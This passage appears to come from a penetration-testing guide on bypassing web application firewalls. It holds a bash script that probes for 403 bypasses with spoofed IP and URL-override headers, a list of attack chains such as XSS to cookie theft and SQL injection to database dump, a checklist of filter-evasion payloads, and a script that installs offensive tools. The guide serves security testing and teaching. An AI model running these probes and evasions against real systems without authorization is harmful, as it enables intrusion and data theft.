    "${PATH};/" "/${PATH}" "//${PATH}" "/.${PATH}" 
    "/.;${PATH}" "/${PATH}%20" "/${PATH}%09" "/${PATH}%00"
    "/${PATH}?" "/${PATH}??" "/${PATH}#" "/${PATH}.html"
    "/${PATH}.json" "/${PATH}.php" "/${PATH}..;/"
  )
  
  for p in "${PATHS[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "${URL}${p}" 2>/dev/null)
    if [ "$CODE" != "403" ] && [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
      echo "  [+] HTTP $CODE: ${URL}${p}"
    fi
  done
  
  # Header bypasses
  echo -e "\n[*] Header bypasses:"
  HEADERS=(
    "X-Original-URL: $PATH"
    "X-Rewrite-URL: $PATH"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Forwarded-For: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Host: 127.0.0.1"
    "X-Forwarded-Host: localhost"
  )
  
  for h in "${HEADERS[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "$h" "${URL}${PATH}" 2>/dev/null)
    if [ "$CODE" != "403" ] && [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
      echo "  [+] HTTP $CODE: $h"
    fi
  done
  
  # Method variations
  echo -e "\n[*] Method variations:"
  METHODS=("GET" "POST" "PUT" "PATCH" "DELETE" "OPTIONS" "HEAD" "TRACE")
  
  for m in "${METHODS[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" "${URL}${PATH}" 2>/dev/null)
    if [ "$CODE" != "403" ] && [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && [ "$CODE" != "405" ]; then
      echo "  [+] HTTP $CODE: $m ${URL}${PATH}"
    fi
  done
  
  # URL override + method override
  echo -e "\n[*] Combined bypasses:"
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "X-Original-URL: $PATH" \
    -H "X-Forwarded-For: 127.0.0.1" \
    "${URL}/" 2>/dev/null)
  echo "  X-Original-URL + X-Forwarded-For: HTTP $CODE"
  
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "X-HTTP-Method-Override: GET" \
    "${URL}${PATH}" 2>/dev/null)
  echo "  POST + X-HTTP-Method-Override: HTTP $CODE"
  
  echo -e "\n============================================"
  ```
  :::
::

---

## Privilege Escalation Chains

::note
A WAF bypass is never the end goal. It **enables** the underlying vulnerability to be exploited. The severity of a WAF bypass depends entirely on what it unlocks.
::

::card-group
  ::card
  ---
  title: WAF Bypass → SQL Injection → Database Dump
  icon: i-lucide-database
  ---
  Bypass WAF SQL injection rules → Extract entire database including credentials, PII, financial data. **Severity: Critical**.
  ::

  ::card
  ---
  title: WAF Bypass → XSS → Account Takeover
  icon: i-lucide-cookie
  ---
  Bypass WAF XSS rules → Execute JavaScript in victim's browser → Steal session cookies → Full account takeover. **Severity: High-Critical**.
  ::

  ::card
  ---
  title: WAF Bypass → RCE → Server Compromise
  icon: i-lucide-terminal
  ---
  Bypass WAF command injection rules → Execute arbitrary commands on server → Full system compromise. **Severity: Critical**.
  ::

  ::card
  ---
  title: WAF Bypass → LFI/Path Traversal → Source Code Leak
  icon: i-lucide-file-code
  ---
  Bypass path traversal rules → Read sensitive files (`.env`, source code, config files) → Credential exposure → Lateral movement. **Severity: High**.
  ::

  ::card
  ---
  title: Origin IP → Bypass All Protection → Direct Attack
  icon: i-lucide-map-pin
  ---
  Discover origin server IP → Connect directly bypassing WAF, rate limits, DDoS protection, bot detection → All attacks now unfiltered. **Severity: Critical**.
  ::

  ::card
  ---
  title: Request Smuggling → Cache Poisoning → Mass Exploitation
  icon: i-lucide-globe
  ---
  Smuggle requests past WAF → Poison web cache with malicious responses → Every visitor receives XSS payload. **Severity: Critical**.
  ::
::

---

## Testing Checklist

::collapsible

```txt [WAF / Proxy Bypass Testing Checklist]
═══════════════════════════════════════════════════════
  WAF / PROXY BYPASS TESTING CHECKLIST
═══════════════════════════════════════════════════════

[ ] RECONNAISSANCE
    [ ] Fingerprint WAF product (wafw00f, nmap, manual)
    [ ] Identify WAF vendor and version
    [ ] Determine ruleset (OWASP CRS? Managed? Custom?)
    [ ] Identify blocking behavior (403? CAPTCHA? Drop?)
    [ ] Check rate limit headers
    [ ] Map which endpoints are behind WAF
    [ ] Check for endpoints NOT behind WAF

[ ] ORIGIN IP DISCOVERY
    [ ] DNS history (SecurityTrails, ViewDNS)
    [ ] Certificate transparency (Censys, Shodan)
    [ ] Email headers (SPF, received-from)
    [ ] Subdomain scanning (non-CDN IPs)
    [ ] Favicon hash search (Shodan)
    [ ] SSRF to leak internal IP
    [ ] Error page IP leaks
    [ ] MX record analysis
    [ ] CloudFlair / bypass-firewalls-by-DNS-history
    [ ] Direct origin connection test

[ ] ENCODING BYPASS
    [ ] Single URL encoding
    [ ] Double URL encoding
    [ ] Triple URL encoding
    [ ] Unicode / UTF-8 encoding
    [ ] Overlong UTF-8
    [ ] HTML entity encoding (named, decimal, hex)
    [ ] Hex encoding
    [ ] Octal encoding
    [ ] Base64 encoding
    [ ] UTF-7 encoding
    [ ] IBM037/EBCDIC charset
    [ ] Mixed encoding combinations

[ ] SQL INJECTION BYPASS
    [ ] Inline comments (/**/, /*!*/)
    [ ] Versioned comments (/*!50000*/)
    [ ] Case variation (sElEcT, uNiOn)
    [ ] Whitespace alternatives (%09, %0A, %0B, %0C, %0D)
    [ ] Parentheses instead of spaces
    [ ] String functions (CHAR(), CONCAT(), CHR())
    [ ] Hex strings (0x61646d696e)
    [ ] Alternative keywords (HAVING, RLIKE, REGEXP)
    [ ] Stacked queries
    [ ] Out-of-band exfiltration
    [ ] sqlmap tamper scripts

[ ] XSS BYPASS
    [ ] Alternative HTML tags (svg, img, details, input, math)
    [ ] Event handler variations (onerror, onload, ontoggle)
    [ ] Without parentheses (alert`1`)
    [ ] Without alert (confirm, prompt, top['alert'])
    [ ] JavaScript encoding (\u0061, \x61, String.fromCharCode)
    [ ] HTML entity in attributes
    [ ] javascript: URI encoding
    [ ] data: URI base64
    [ ] Null bytes in tags
    [ ] Whitespace/tab in attributes
    [ ] Forward slash as separator
    [ ] DOM-based (no tags needed)
    [ ] Template literals (${})
    [ ] SVG with namespace

[ ] COMMAND INJECTION BYPASS
    [ ] Separator alternatives (%0a, backtick, $())
    [ ] Space bypass (${IFS}, %09, {cmd,args})
    [ ] Quote insertion (c'a't, c"a"t)
    [ ] Wildcard commands (/???/c?t)
    [ ] Alternative commands (tac, head, xxd)
    [ ] Base64/hex encoded commands
    [ ] Variable concatenation

[ ] PATH TRAVERSAL BYPASS
    [ ] URL encoding (..%2f)
    [ ] Double URL encoding (..%252f)
    [ ] Unicode overlong (..%c0%af)
    [ ] Backslash (..%5c)
    [ ] Null byte (..%00)
    [ ] Dot-dot variations (....// , ..;/)
    [ ] Mixed encoding

[ ] REQUEST MANIPULATION
    [ ] Content-Type switching (JSON→form→multipart→XML)
    [ ] Chunked Transfer-Encoding
    [ ] Charset encoding (ibm037, utf-7, utf-16)
    [ ] HTTP Parameter Pollution
    [ ] HTTP method change
    [ ] Method override headers
    [ ] Missing Content-Type
    [ ] Invalid Content-Type

[ ] PROTOCOL BYPASS
    [ ] HTTP/2 exclusive features
    [ ] HTTP/2 → HTTP/1.1 desync
    [ ] WebSocket upgrade
    [ ] h2c upgrade smuggling
    [ ] HTTP/0.9
    [ ] IPv6 (bypass IPv4-only WAF)
    [ ] Different ports (8080, 8443)

[ ] REQUEST SMUGGLING
    [ ] CL.TE desync
    [ ] TE.CL desync
    [ ] TE.TE obfuscation
    [ ] HTTP/2 downgrade smuggling
    [ ] H2.CL desync
    [ ] Automated testing (smuggler.py)

[ ] 403/401 BYPASS
    [ ] URL override headers (X-Original-URL, X-Rewrite-URL)
    [ ] IP spoof headers
    [ ] Path manipulation (case, encoding, dots)
    [ ] HTTP method change
    [ ] Protocol version change
    [ ] Host header variations
    [ ] Combined header + path techniques

[ ] CHAIN WITH IMPACT
    [ ] → SQLi (database dump)
    [ ] → XSS (session theft, account takeover)
    [ ] → RCE (server compromise)
    [ ] → LFI (source code / credential leak)
    [ ] → SSRF (internal network access)
    [ ] → Cache poisoning (mass exploitation)

═══════════════════════════════════════════════════════
```

::

---

## Tool Installation

::code-collapse
```bash [install_waf_tools.sh]
#!/bin/bash
#============================================================
# Install WAF Bypass Testing Tools
#============================================================

echo "[*] Installing WAF bypass tools..."

# Python tools
pip3 install wafw00f
pip3 install sqlmap

# wafw00f
pip3 install wafw00f

# SQLMap (Kali pre-installed)
sudo apt install sqlmap -y 2>/dev/null

# Go tools
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# bypass-403
git clone https://github.com/iamj0ker/bypass-403.git /opt/bypass-403

# 403bypasser
git clone https://github.com/yunemse48/403bypasser.git /opt/403bypasser
cd /opt/403bypasser && pip3 install -r requirements.txt

# WAFNinja
git clone https://github.com/khalilbijjou/WAFNinja.git /opt/WAFNinja

# waf-bypass
git clone https://github.com/nemesida-waf/waf-bypass.git /opt/waf-bypass
cd /opt/waf-bypass && pip3 install -r requirements.txt

# smuggler
git clone https://github.com/defparam/smuggler.git /opt/smuggler

# h2csmuggler
git clone https://github.com/BishopFox/h2csmuggler.git /opt/h2csmuggler
cd /opt/h2csmuggler && pip3 install -r requirements.txt

# CloudFlair
git clone https://github.com/christophetd/CloudFlair.git /opt/CloudFlair
cd /opt/CloudFlair && pip3 install -r requirements.txt

# bypass-firewalls-by-DNS-history
git clone https://github.com/vincentcox/bypass-firewalls-by-DNS-history.git /opt/bypass-dns

# Nmap
sudo apt install nmap -y

# Nuclei templates update
nuclei -update-templates

echo "[+] All WAF bypass tools installed!"
```
::

---

## References & Resources

::card-group
  ::card
  ---
  title: HackTricks - WAF Bypass
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/waf-bypass.html
  target: _blank
  ---
  Comprehensive WAF bypass guide covering encoding techniques, payload obfuscation, request smuggling, and vendor-specific bypasses.
  ::

  ::card
  ---
  title: PayloadsAllTheThings - WAF Bypass
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Massive collection of web attack payloads including WAF bypass techniques for SQLi, XSS, command injection, and path traversal.
  ::

  ::card
  ---
  title: PortSwigger - Request Smuggling
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/request-smuggling
  target: _blank
  ---
  Interactive labs and research on HTTP request smuggling for bypassing front-end WAFs and security controls.
  ::

  ::card
  ---
  title: OWASP ModSecurity CRS
  icon: i-lucide-shield-check
  to: https://coreruleset.org/
  target: _blank
  ---
  Official OWASP Core Rule Set documentation. Understanding the rules helps identify bypass vectors for ModSecurity deployments.
  ::

  ::card
  ---
  title: Cloudflare WAF Documentation
  icon: i-lucide-cloud
  to: https://developers.cloudflare.com/waf/
  target: _blank
  ---
  Official Cloudflare WAF documentation covering managed rules, custom rules, and rate limiting implementation details.
  ::

  ::card
  ---
  title: SQLMap Tamper Scripts
  icon: i-simple-icons-github
  to: https://github.com/sqlmapproject/sqlmap/tree/master/tamper
  target: _blank
  ---
  Complete collection of SQLMap tamper scripts for WAF evasion with detailed documentation on each encoding technique.
  ::

  ::card
  ---
  title: Smashing the State Machine (PortSwigger Research)
  icon: i-lucide-flask-conical
  to: https://portswigger.net/research/smashing-the-state-machine
  target: _blank
  ---
  Groundbreaking research on single-packet attacks and HTTP/2 race conditions for bypassing rate limiters and WAFs.
  ::

  ::card
  ---
  title: WAF Bypass Techniques (0xInfection)
  icon: i-simple-icons-github
  to: https://github.com/0xInfection/Awesome-WAF
  target: _blank
  ---
  Curated list of WAF bypass resources, techniques, tools, and research papers organized by WAF vendor.
  ::

  ::card
  ---
  title: Finding Origin IPs Behind CDN
  icon: i-lucide-map-pin
  to: https://blog.detectify.com/industry/how-to-find-the-ip-behind-cloudflare/
  target: _blank
  ---
  Techniques for discovering the real origin IP behind Cloudflare and other CDNs including DNS history and certificate correlation.
  ::

  ::card
  ---
  title: Nuclei WAF Templates
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/nuclei-templates/tree/main/http/technologies
  target: _blank
  ---
  Community-maintained nuclei templates for WAF detection, fingerprinting, and bypass verification.
  ::

  ::card
  ---
  title: wafw00f
  icon: i-simple-icons-github
  to: https://github.com/EnableSecurity/wafw00f
  target: _blank
  ---
  WAF fingerprinting tool that identifies 150+ WAF products from HTTP response characteristics.
  ::

  ::card
  ---
  title: HTTP/2 Security Research
  icon: i-lucide-flask-conical
  to: https://portswigger.net/research/http2
  target: _blank
  ---
  PortSwigger's collection of HTTP/2 security research including H2 desync attacks, header injection, and protocol-level bypass techniques.
  ::
::